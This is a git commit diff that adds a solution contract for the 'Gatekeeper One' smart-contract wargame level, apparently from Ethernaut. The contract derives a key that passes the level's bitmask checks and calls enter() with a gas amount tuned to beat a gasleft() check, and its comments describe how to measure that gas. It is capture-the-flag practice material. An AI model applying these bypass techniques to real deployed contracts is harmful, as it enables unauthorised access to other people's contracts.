e8850e1dc9f86e94aca5f74a5f9935883b29b774
Albert Lin <albert@dinngo.co>
2022-06-30 18:30:15 +0800

    Add gatekepperOne solution

--- contracts/13_GatekeeperOne/gatekeeperOne.sol
+++ contracts/13_GatekeeperOne/gatekeeperOne.sol
@@ -8,7 +8,7 @@
 // You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
 
 // ---- Solution ---- //
-// node scripts/privacy.js
+// gatekeeperOneSol.sol
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
@@ -31,28 +31,13 @@ contract GatekeeperOne {
     }
 
     modifier gateThree(bytes8 _gateKey) {
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
-            "GatekeeperOne: invalid gateThree part one"
-        );
-        require(
-            uint32(uint64(_gateKey)) != uint64(_gateKey),
-            "GatekeeperOne: invalid gateThree part two"
-        );
-        require(
-            uint32(uint64(_gateKey)) == uint16(tx.origin),
-            "GatekeeperOne: invalid gateThree part three"
-        );
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
         _;
     }
 
-    function enter(bytes8 _gateKey)
-        public
-        gateOne
-        gateTwo
-        gateThree(_gateKey)
-        returns (bool)
-    {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
--- contracts/13_GatekeeperOne/gatekeeperOneSol.sol
+++ contracts/13_GatekeeperOne/gatekeeperOneSol.sol
@@ -1,63 +1,24 @@
-// Gatekeeper One
-// Difficulty 5/10
-
-// Make it past the gatekeeper and register as an entrant to pass this level.
-
-// Things that might help:
-// Remember what you've learned from the Telephone and Token levels.
-// You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
-
-// ---- Solution ---- //
-// node scripts/privacy.js
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
-
-// import "@openzeppelin/contracts/math/SafeMath.sol";
 
 interface GatekeeperOne {
     function enter(bytes8 _gateKey) external returns (bool);
 }
 
 contract GatekeeperOneSol {
-    function attack(GatekeeperOne one) external {
-        one.enter(_gateKey);
-    }
+    // 1. send a fail tx to contract
+    // 2. find out the gasleft() through
+    //   - use debug of remix, and find `mod` opcode with stack[0] or
+    //   - use etherscan vmtrace page
+    //     1. find `GAS` opcode,
+    //     2. gasleft() value will be in next row of `GAS` opcode
+    // 3. calculate the gas cost before gasleft() and _gas
+    function attack(GatekeeperOne _one, uint256 _gas) external {
+        // after testing, it will cost 254 before gasleft(), use to calculate _gas, for example:
+        // `uint256 _gas = 8191 * 20 + 254; `
 
-    // modifier gateOne() {
-    //     require(msg.sender != tx.origin);
-    //     _;
-    // }
-
-    modifier gateTwo() {
-        require(gasleft().mod(8191) == 0);
-        _;
-    }
-
-    modifier gateThree(bytes8 _gateKey) {
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
-            "GatekeeperOne: invalid gateThree part one"
-        );
-        require(
-            uint32(uint64(_gateKey)) != uint64(_gateKey),
-            "GatekeeperOne: invalid gateThree part two"
-        );
-        require(
-            uint32(uint64(_gateKey)) == uint16(tx.origin),
-            "GatekeeperOne: invalid gateThree part three"
-        );
-        _;
-    }
-
-    function enter(bytes8 _gateKey)
-        public
-        gateOne
-        gateTwo
-        gateThree(_gateKey)
-        returns (bool)
-    {
-        entrant = tx.origin;
-        return true;
+        // _gas could be: 999556 in my test
+        bytes8 _gateKey = bytes8(uint64(uint16(msg.sender))) | bytes8(0x0000000100000000);
+        _one.enter{gas: _gas}(_gateKey);
     }
 }
